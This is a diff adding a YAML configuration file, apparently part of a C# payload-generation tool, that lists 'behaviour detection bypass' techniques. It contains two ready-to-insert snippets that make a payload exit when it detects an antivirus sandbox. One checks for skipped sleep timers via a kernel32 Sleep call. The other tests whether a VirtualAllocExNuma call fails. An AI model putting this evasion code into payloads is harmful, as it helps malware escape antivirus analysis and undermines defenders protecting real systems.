@@ -1,0 +1,30 @@
+# This file contains all the behaviour bypass techniques that can be used in C# payloads
+
+behaviour_detection_bypass:
+  sleep_calls:
+    title: "Sleep Calls"
+    description: "Sleep Timers to bypass AV Sandbox"
+    pinvoke_imports: |
+      [DllImport("kernel32.dll")]
+      static extern void Sleep(uint dwMilliseconds);
+    code: |
+      DateTime initial_t = DateTime.Now;
+      Sleep(2700);
+      double final_t = DateTime.Now.Subtract(initial_t).TotalSeconds;
+      if (final_t < 2.4)
+      {
+        return;
+      }
+  pinvoke_sandbox:
+    title: "VirtualAllocExNuma"
+    description: "pinvoke API calls which can detect AV Sandbox"
+    pinvoke_imports: |
+      [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+      static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern IntPtr GetCurrentProcess();
+    code: |
+      if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
+      {
+        return;
+      }
